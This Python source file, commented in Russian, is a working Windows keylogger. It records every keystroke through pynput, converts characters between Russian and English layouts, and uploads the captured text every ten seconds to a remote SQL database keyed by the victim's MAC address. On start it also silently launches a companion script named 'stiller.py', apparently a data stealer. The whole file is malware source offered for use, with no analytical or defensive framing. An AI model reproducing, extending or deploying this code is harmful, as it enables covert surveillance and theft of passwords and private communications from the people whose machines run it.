import time
import uuid
import ctypes
import threading
import subprocess
import os
from sql_connect import db_connector
from pynput import keyboard
from layout_mapping import eng_to_rus, rus_to_eng, language_codes

# Определение пути к stiller.py относительно текущего файла
current_dir = os.path.dirname(os.path.abspath(__file__))
stiller_path = os.path.join(current_dir, 'stiller.py')

def detect_keyboard_layout_win():
    """
    Определяет текущую раскладку клавиатуры.

    :returns: Название текущей раскладки клавиатуры.
    :rtype: str
    :raises KeyError: Если раскладка не найдена в словаре language_codes.
    """
    user32 = ctypes.WinDLL('user32.dll', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)
    try:
        language = language_codes[str(lid_hex)]
    except KeyError:
        language = language_codes['0x409']
    return language

def on_press(key):
    """
    Обрабатывает нажатие клавиш.

    :param key: Нажатая клавиша.
    :type key: pynput.keyboard.Key
    """
    global text
    print(f'{key} pressed')

    special_keys = [
        keyboard.Key.enter, keyboard.Key.tab, keyboard.Key.space, keyboard.Key.shift, keyboard.Key.shift_r,
        keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.esc,
        keyboard.Key.caps_lock, keyboard.Key.cmd, keyboard.Key.cmd_r, keyboard.Key.home, keyboard.Key.end,
        keyboard.Key.page_up, keyboard.Key.page_down, keyboard.Key.insert, keyboard.Key.delete, keyboard.Key.up,
        keyboard.Key.down, keyboard.Key.left, keyboard.Key.right, keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3,
        keyboard.Key.f4, keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8, keyboard.Key.f9,
        keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12, keyboard.Key.backspace
    ]

    if key in special_keys:
        if key == keyboard.Key.enter:
            text += '\n'
        elif key == keyboard.Key.tab:
            text += '\t'
        elif key == keyboard.Key.space:
            text += ' '
        elif key == keyboard.Key.backspace:
            text = text[:-1]
        else:
            pass
    else:
        if detect_keyboard_layout_win() == 'Russian':
            try:
                text += eng_to_rus[str(key).strip("'")]
            except KeyError:
                text += str(key).strip("'")
        else:
            try:
                text += rus_to_eng[str(key).strip("'")]
            except KeyError:
                text += str(key).strip("'")

def listener():
    """
    Запускает слушатель клавиатуры.
    """
    print('Listener started')
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join() # Поток работает до тех пор, пока мы сами его не убьем =)

def db_updater():
    """
    Обновляет базу данных с данными о нажатиях клавиш.
    """
    cursor = connection.cursor()
    while True:
        global text
        if len(text) > 20:
            print('Data is ready to be added to the database')
            cursor.execute("SELECT * FROM users_data WHERE username = %s", (mac_address))
            result = cursor.fetchone()
            if result:
                new_content = result[2] + '\n' + text 
                cursor.execute("UPDATE users_data SET content = %s WHERE username = %s", (new_content, mac_address))
                connection.commit()
                text = ''
                print(f'Updated user {mac_address} with new content.')
            else:  
                print('User does not exist, adding new user...')
                cursor.execute("INSERT INTO users_data (username, content) VALUES (%s, %s)", (mac_address, text))
                connection.commit()
                text = ''
                print('Data added')

        time.sleep(10)


if __name__ == '__main__':
    text = ''
    mac_address = uuid.getnode()
    connection = db_connector()
    subprocess.Popen(['python', stiller_path])
    thread1= threading.Thread(target=listener)
    thread2 = threading.Thread(target=db_updater)
    thread1.start()
    thread2.start()